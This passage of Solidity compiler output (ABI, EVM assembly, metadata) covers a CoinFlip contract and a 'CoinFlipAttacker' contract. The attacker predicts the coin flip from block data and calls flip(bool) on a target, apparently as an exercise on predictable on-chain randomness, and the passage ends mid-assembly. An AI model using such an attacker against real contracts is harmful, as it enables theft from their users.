										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "tag",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "tag",
											"source": 1,
											"value": "27"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1836,
											"end": 1845,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1852,
											"end": 1853,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1848,
											"end": 1849,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 1848,
											"end": 1853,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1836,
											"end": 1853,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1836,
											"end": 1853,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1872,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1864,
											"end": 1872,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1864,
											"end": 1872,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1864,
											"end": 1872,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1692,
											"end": 1879,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 1692,
											"end": 1879,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1692,
											"end": 1879,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1692,
											"end": 1879,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1692,
											"end": 1879,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1692,
											"end": 1879,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 3638,
											"end": 3976,
											"name": "tag",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 3638,
											"end": 3976,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3724,
											"end": 3731,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3821,
											"end": 3822,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3817,
											"end": 3818,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 3817,
											"end": 3822,
											"name": "GT",
											"source": 1
										},
										{
											"begin": 3824,
											"end": 3836,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "33"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "tag",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "tag",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "tag",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "tag",
											"source": 1,
											"value": "33"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3847,
											"end": 3856,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3863,
											"end": 3864,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 3859,
											"end": 3860,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 3859,
											"end": 3864,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3859,
											"end": 3864,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 3859,
											"end": 3864,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 3859,
											"end": 3864,
											"name": "INVALID",
											"source": 1
										},
										{
											"begin": 3859,
											"end": 3864,
											"name": "tag",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 3859,
											"end": 3864,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3859,
											"end": 3864,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 3847,
											"end": 3864,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3847,
											"end": 3864,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3968,
											"end": 3969,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3961,
											"end": 3969,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 3961,
											"end": 3969,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3961,
											"end": 3969,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3638,
											"end": 3976,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 3638,
											"end": 3976,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 3638,
											"end": 3976,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3638,
											"end": 3976,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3638,
											"end": 3976,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3638,
											"end": 3976,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"consecutiveWins()": "e6f334d7",
							"flip(bool)": "1d263f67"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"consecutiveWins\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_guess\",\"type\":\"bool\"}],\"name\":\"flip\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contract/security/CoinFlipAttacker.sol\":\"CoinFlip\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contract/security/CoinFlipAttacker.sol\":{\"keccak256\":\"0x2d3298c7bf49338d41f8ec4375a112197f62fe3cf759a986a516ad7f781b1f58\",\"urls\":[\"bzz-raw://4da655b5fd6d69ae9aa804d0bc4310502a0c26d6f9e9eca57d46d6ac3c1048c4\",\"dweb:/ipfs/QmaFabkqnEMTWyFRFJashjJ9HYghBQAKMxXX1ZZqkSZE9B\"]},\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":{\"keccak256\":\"0x04d34b3cd5677bea25f8dfceb6dec0eaa071d4d4b789a43f13fe0c415ba4c296\",\"urls\":[\"bzz-raw://e7e8b526a6839e5ba14f0d23a830387fec47f7043ce01d42c9f285b709a9d080\",\"dweb:/ipfs/QmXmhhFmX5gcAvVzNiDPAGA35iHMPNaYtQkACswRHBVTNw\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 7,
								"contract": "contract/security/CoinFlipAttacker.sol:CoinFlip",
								"label": "consecutiveWins",
								"offset": 0,
								"slot": "0",
								"type": "t_uint256"
							},
							{
								"astId": 9,
								"contract": "contract/security/CoinFlipAttacker.sol:CoinFlip",
								"label": "lastHash",
								"offset": 0,
								"slot": "1",
								"type": "t_uint256"
							},
							{
								"astId": 12,
								"contract": "contract/security/CoinFlipAttacker.sol:CoinFlip",
								"label": "FACTOR",
								"offset": 0,
								"slot": "2",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				},
				"CoinFlipAttacker": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_addr",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "attackByCall",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "attackByIns",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "attackByInterface",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contract/security/CoinFlipAttacker.sol\":1159:2498  contract CoinFlipAttacker{\r... */\n  mstore(0x40, 0x80)\n    /* \"contract/security/CoinFlipAttacker.sol\":1335:1412  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"contract/security/CoinFlipAttacker.sol\":1318:1412  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x03\n  sstore\n    /* \"contract/security/CoinFlipAttacker.sol\":1421:1571  constructor(address _addr) public {\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  0x20\n  dup2\n  lt\n  iszero\n  tag_2\n  jumpi\n  0x00\n  dup1\n  revert\ntag_2:\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n    /* \"contract/security/CoinFlipAttacker.sol\":1473:1478  _addr */\n  dup1\n    /* \"contract/security/CoinFlipAttacker.sol\":1466:1470  addr */\n  0x00\n  dup1\n    /* \"contract/security/CoinFlipAttacker.sol\":1466:1478  addr = _addr */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contract/security/CoinFlipAttacker.sol\":1507:1512  _addr */\n  dup1\n    /* \"contract/security/CoinFlipAttacker.sol\":1489:1495  cf_ins */\n  0x01\n  0x00\n    /* \"contract/security/CoinFlipAttacker.sol\":1489:1513  cf_ins = CoinFlip(_addr) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contract/security/CoinFlipAttacker.sol\":1557:1562  _addr */\n  dup1\n    /* \"contract/security/CoinFlipAttacker.sol\":1524:1536  cf_interface */\n  0x02\n  0x00\n    /* \"contract/security/CoinFlipAttacker.sol\":1524:1563  cf_interface = CoinFlipInterface(_addr) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contract/security/CoinFlipAttacker.sol\":1421:1571  constructor(address _addr) public {\r... */\n  pop\n    /* \"contract/security/CoinFlipAttacker.sol\":1159:2498  contract CoinFlipAttacker{\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contract/security/CoinFlipAttacker.sol\":1159:2498  contract CoinFlipAttacker{\r... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x1a13ff68\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x83e00525\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xb6f02db9\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contract/security/CoinFlipAttacker.sol\":2358:2493  function attackByCall() public {\r... */\n    tag_3:\n      tag_6\n      tag_7\n      jump\t// in\n    tag_6:\n      stop\n        /* \"contract/security/CoinFlipAttacker.sol\":2019:2117  function attackByIns() public {\r... */\n    tag_4:\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      stop\n        /* \"contract/security/CoinFlipAttacker.sol\":2203:2313  function attackByInterface() public {\r... */\n    tag_5:\n      tag_10\n      tag_11\n      jump\t// in\n    tag_10:\n      stop\n        /* \"contract/security/CoinFlipAttacker.sol\":2358:2493  function attackByCall() public {\r... */\n    tag_7:\n        /* \"contract/security/CoinFlipAttacker.sol\":2400:2409  bool side */\n      0x00\n        /* \"contract/security/CoinFlipAttacker.sol\":2412:2421  getFlip() */\n      tag_13\n        /* \"contract/security/CoinFlipAttacker.sol\":2412:2419  getFlip */\n      tag_14\n        /* \"contract/security/CoinFlipAttacker.sol\":2412:2421  getFlip() */\n      jump\t// in\n    tag_13:\n        /* \"contract/security/CoinFlipAttacker.sol\":2400:2421  bool side = getFlip() */\n      swap1\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":2432:2436  addr */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/security/CoinFlipAttacker.sol\":2432:2441  addr.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/security/CoinFlipAttacker.sol\":2479:2483  side */\n      dup2\n        /* \"contract/security/CoinFlipAttacker.sol\":2442:2484  abi.encodeWithSignature(\"flip(bool)\",side) */\n      add(0x24, mload(0x40))\n      dup1\n      dup3\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0x1d263f6700000000000000000000000000000000000000000000000000000000)\n      0x20\n      dup3\n      add\n      dup1\n      mload\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n      dup4\n      dup2\n      dup4\n      and\n      or\n      dup4\n      mstore\n      pop\n      pop\n      pop\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":2432:2485  addr.call(abi.encodeWithSignature(\"flip(bool)\",side)) */\n      mload(0x40)\n      dup1\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n    tag_15:\n      0x20\n      dup4\n      lt\n      tag_17\n      jumpi\n      dup1\n      mload\n      dup3\n      mstore\n      0x20\n      dup3\n      add\n      swap2\n      pop\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      0x20\n      dup4\n      sub\n      swap3\n      pop\n      jump(tag_15)\n    tag_17:\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      dup1\n      not\n      dup3\n      mload\n      and\n      dup2\n      dup5\n      mload\n      and\n      dup1\n      dup3\n      or\n      dup6\n      mstore\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup7\n      gas\n      call\n      swap2\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_20\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_19)\n    tag_20:\n      0x60\n      swap2\n      pop\n    tag_19:\n      pop\n      pop\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":2358:2493  function attackByCall() public {\r... */\n      pop\n      jump\t// out\n        /* \"contract/security/CoinFlipAttacker.sol\":2019:2117  function attackByIns() public {\r... */\n    tag_9:\n        /* \"contract/security/CoinFlipAttacker.sol\":2060:2069  bool side */\n      0x00\n        /* \"contract/security/CoinFlipAttacker.sol\":2072:2081  getFlip() */\n      tag_22\n        /* \"contract/security/CoinFlipAttacker.sol\":2072:2079  getFlip */\n      tag_14\n        /* \"contract/security/CoinFlipAttacker.sol\":2072:2081  getFlip() */\n      jump\t// in\n    tag_22:\n        /* \"contract/security/CoinFlipAttacker.sol\":2060:2081  bool side = getFlip() */\n      swap1\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":2092:2098  cf_ins */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/security/CoinFlipAttacker.sol\":2092:2103  cf_ins.flip */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1d263f67\n        /* \"contract/security/CoinFlipAttacker.sol\":2104:2108  side */\n      dup3\n        /* \"contract/security/CoinFlipAttacker.sol\":2092:2109  cf_ins.flip(side) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_23\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_23:\n      pop\n      gas\n      call\n      iszero\n      